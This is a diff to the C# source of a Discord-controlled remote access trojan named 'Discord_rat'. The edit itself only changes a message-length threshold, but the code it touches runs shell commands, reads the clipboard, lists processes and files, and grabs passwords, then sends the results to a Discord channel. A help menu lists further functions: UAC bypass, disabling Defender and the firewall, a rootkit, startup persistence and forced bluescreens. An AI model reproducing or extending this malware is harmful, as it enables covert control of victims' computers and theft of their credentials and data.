@@ -383,7 +383,7 @@ namespace Discord_rat
             process.Start();
             string data = process.StandardOutput.ReadToEnd();
             process.WaitForExit();
-            if (data.Length >= 3990)
+            if (data.Length >= 1990)
             {
                 await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                 await Send_message(channelid, "Command executed!");
@@ -407,7 +407,7 @@ namespace Discord_rat
         public static async Task dir(string channelid)
         {
             string data = String.Join("\n", Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*", SearchOption.TopDirectoryOnly));
-            if (data.Length >= 3990)
+            if (data.Length >= 1990)
             {
                 await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                 await Send_message(channelid, "Command executed!");
@@ -519,7 +519,7 @@ namespace Discord_rat
                 return;
             }
             if (data == null) { await Send_message(channelid, "Clipboard empty!"); return; }
-            if (data.Length >= 3990)
+            if (data.Length >= 1990)
             {
                 await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                 await Send_message(channelid, "Command executed!");
@@ -746,7 +746,7 @@ namespace Discord_rat
                 temp.Add(i.ProcessName);
             }
             string data= string.Join("\n", temp);
-            if (data.Length >= 3990)
+            if (data.Length >= 1990)
             {
                 await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                 await Send_message(channelid, "Command executed!");
@@ -772,7 +772,7 @@ namespace Discord_rat
         public static async Task sendpassword(string channelid)
         {
             string data = await password();
-            if (data.Length >= 3990)
+            if (data.Length >= 1990)
             {
                 await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "password.txt" });
                 await Send_message(channelid, "Command executed!");
@@ -833,9 +833,9 @@ namespace Discord_rat
         public static async Task helpmenu(string channelid) 
         {
             string data = "--> !message = Show a message box displaying your text / Syntax  = \"!message example\"\n--> !shell = Execute a shell command /Syntax  = \"!shell whoami\"\n--> !voice = Make a voice say outloud a custom sentence / Syntax = \"!voice test\"\n--> !admincheck = Check if program has admin privileges\n--> !cd = Changes directory\n--> !dir = display all items in current dir\n--> !download = Download a file from infected computer\n--> !upload = Upload file to the infected computer / Syntax = \"!upload file.png\" (with attachment)\n--> !uploadlink = Upload file to the infected computer / Syntax = \"!upload link file.png\"\n--> !delete = deletes a file / Syntax = \"!delete / path to / the / file.txt\"\n--> !write = Type your desired sentence on computer\n--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper\" (with attachment)\n--> !clipboard = Retrieve infected computer clipboard content\n--> !idletime = Get the idle time of user\'s on target computer\n--> !currentdir = display the current dir\n--> !block = Blocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !unblock = Unblocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !screenshot = Get the screenshot of the user\'s current screen\n--> !exit = Exit program\n--> !kill = Kill a session or all sessions / Syntax = \"!kill session-3\" or \"!kill all\"\n--> !uacbypass = attempt to bypass uac to gain admin by using fod helper\n--> !shutdown = shutdown computer\n--> !restart = restart computer\n--> !logoff = log off current user\n--> !bluescreen = BlueScreen PC\n--> !datetime = display system date and time\n--> !prockill = kill a process by name / syntax = \"!kill process\"\n--> !disabledefender = Disable windows defender(requires admin)\n--> !disablefirewall = Disable windows firewall(requires admin)\n--> !audio = play a audio file on the target computer / Syntax = \"!audio\" (with attachment)\n--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)\n--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)\n--> !website = open a website on the infected computer / syntax = \"!website www.google.com\"\n--> !disabletaskmgr = disable task manager(Admin rights are required)\n--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)\n--> !startup = add to startup(when computer go on this file starts)\n--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise\n--> !listprocess = Get all process\'s\n--> !password = grab all passwords\n--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)\n--> !unrookit = Remove the rootkit(Admin rights are required)\n--> !help = This help menu";
-            if (data.Length >= 3990)
+            if (data.Length >= 1990)
             {
-                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "password.txt" });
+                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "help.txt" });
                 await Send_message(channelid, "Command executed!");
             }
             else
